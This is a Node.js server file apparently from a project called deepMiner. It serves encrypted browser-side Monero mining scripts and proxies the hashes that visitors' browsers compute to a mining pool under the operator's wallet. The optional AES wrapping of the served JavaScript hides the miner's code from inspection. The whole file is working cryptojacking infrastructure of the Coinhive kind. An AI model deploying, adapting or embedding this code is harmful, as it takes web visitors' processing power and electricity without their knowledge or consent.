/**
 * deepMiner v2.0
 * Idea from coinhive.com
 * For any XMR pool with your wallet
 * By evil7@deePwn
 */

var http = require("http"),
    WebSocket = require("ws"),
    net = require("net"),
    fs = require("fs"),
    CryptoJS = require("crypto-js");

var conf = JSON.parse(fs.readFileSync(__dirname + "/config.json", "utf8"));

//heroku global config
conf.lport = process.env.PORT || conf.lport;
conf.domain = process.env.DOMAIN || conf.domain;
conf.pool = process.env.POOL || conf.pool;
conf.addr = process.env.ADDR || conf.addr;
conf.pass = process.env.PASS || conf.pass;
conf.cryp = process.env.CRYP || conf.cryp;

// crypto for AES
function rand(n) {
    var chars = "01234567890ABCDEF";
    var res = "";
    for (var i = 0; i < n; i++) {
        var id = Math.ceil(Math.random() * (chars.length - 1));
        res += chars[id];
    }
    return res;
}

function enAES(key, str) {
    var encrypt = CryptoJS.AES.encrypt(str, key);
    return encrypt.toString();
}

function deAES(key, str) {
    var decrypt = CryptoJS.AES.decrypt(str, key);
    return decrypt.toString(CryptoJS.enc.Utf8);
}

var file = file || {};
var fileLists = ["/index.html", "/miner.html", "/lib/worker.min.js", "/lib/deepMiner.min.js", "/lib/cryptonight.wasm"];
for (var i = 0; i < fileLists.length; i++) {
    var currentFile = fileLists[i];
    if (fileLists[i].match(/\.wasm$/)) {
        file[currentFile] = fs.readFileSync(__dirname + "/web" + currentFile, null);
    } else {
        file[currentFile] = fs
            .readFileSync(__dirname + "/web" + currentFile, "utf8")
            .replace(/%deepMiner_domain%/g, conf.domain);
    }
}

var stats = (req, res) => {
    req.url = req.url === "/" ? "/index.html" : req.url;
    if (req.url.match(/\.min\.js/)) {
        res.setHeader("Access-Control-Allow-Origin", "*");
        if (conf.cryp) {
            var randKey = rand(32);
            file[req.url] = randKey + "#" + enAES(randKey, file[req.url]);
        }
        res.setHeader("Content-Type", "application/javascript");
    } else if (req.url.match(/\.html$/)) {
        res.setHeader("Content-Type", "text/html");
    } else if (req.url.match(/\.wasm$/)) {
        res.setHeader("Content-Type", "application/wasm");
    } else {
        res.setHeader("Content-Type", "application/octet-stream");
    }
    res.end(file[req.url]);
};
var web = http.createServer(stats);

// Miner Proxy Srv
var srv = new WebSocket.Server({
    server: web,
    path: "/proxy",
    maxPayload: 1024
});
srv.on("connection", ws => {
    var conn = {
        uid: null,
        pid: rand(16).toString("hex"),
        workerId: null,
        found: 0,
        accepted: 0,
        ws: ws,
        pl: new net.Socket()
    };
    var pool = conf.pool.split(":");
    conn.pl.connect(
        pool[1],
        pool[0]
    );

    // Trans WebSocket to PoolSocket
    function ws2pool(data) {
        var buf;
        data = JSON.parse(data);
        switch (data.type) {
            case "auth": {
                conn.uid = data.params.site_key;
                if (data.params.user) {
                    conn.uid += "@" + data.params.user;
                }
                buf = {
                    method: "login",
                    params: {
                        login: conf.addr,
                        pass: conf.pass,
                        rigid: "",
                        agent: "deepMiner"
                    },
                    id: conn.pid
                };
                buf = JSON.stringify(buf) + "\n";
                conn.pl.write(buf);
                console.log(buf + "\n");
                break;
            }
            case "submit": {
                conn.found++;
                buf = {
                    method: "submit",
                    params: {
                        id: conn.workerId,
                        job_id: data.params.job_id,
                        nonce: data.params.nonce,
                        result: data.params.result
                    },
                    id: conn.pid
                };
                buf = JSON.stringify(buf) + "\n";
                conn.pl.write(buf);
                break;
            }
        }
    }

    // Trans PoolSocket to WebSocket
    function pool2ws(data) {
        try {
            var buf;
            data = JSON.parse(data);
            if (data.id === conn.pid && data.result) {
                if (data.result.id) {
                    conn.workerId = data.result.id;
                    buf = {
                        type: "authed",
                        params: {
                            token: "",
                            hashes: conn.accepted
                        }
                    };
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
                    buf = {
                        type: "job",
                        params: data.result.job
                    };
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
                } else if (data.result.status === "OK") {
                    conn.accepted++;
                    buf = {
                        type: "hash_accepted",
                        params: {
                            hashes: conn.accepted
                        }
                    };
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
                }
            }
            if (data.id === conn.pid && data.error) {
                if (data.error.code === -1) {
                    buf = {
                        type: "error",
                        params: {
                            error: data.error.message
                        }
                    };
                } else {
                    buf = {
                        type: "banned",
                        params: {
                            banned: conn.pid
                        }
                    };
                }
                buf = JSON.stringify(buf);
                conn.ws.send(buf);
            }
            if (data.method === "job") {
                buf = {
                    type: "job",
                    params: data.params
                };
                buf = JSON.stringify(buf);
                conn.ws.send(buf);
            }
        } catch (error) {
            console.warn("[!] Error: " + error.message);
        }
    }
    conn.ws.on("message", data => {
        ws2pool(data);
        console.log("[>] Request: " + conn.uid + "\n\n" + data + "\n");
    });
    conn.ws.on("error", data => {
        console.log("[!] " + conn.uid + " WebSocket " + data + "\n");
        conn.pl.destroy();
    });
    conn.ws.on("close", () => {
        console.log("[!] " + conn.uid + " offline.\n");
        conn.pl.destroy();
    });
    conn.pl.on("data", function(data) {
        var linesdata = data;
        var lines = String(linesdata).split("\n");
        if (lines[1].length > 0) {
            console.log("[<] Response: " + conn.pid + "\n\n" + lines[0] + "\n");
            console.log("[<] Response: " + conn.pid + "\n\n" + lines[1] + "\n");
            pool2ws(lines[0]);
            pool2ws(lines[1]);
        } else {
            console.log("[<] Response: " + conn.pid + "\n\n" + data + "\n");
            pool2ws(data);
        }
    });
    conn.pl.on("error", data => {
        console.log("PoolSocket " + data + "\n");
        if (conn.ws.readyState !== 3) {
            conn.ws.close();
        }
    });
    conn.pl.on("close", () => {
        console.log("PoolSocket Closed.\n");
        if (conn.ws.readyState !== 3) {
            conn.ws.close();
        }
    });
});
web.listen(conf.lport, conf.lhost);
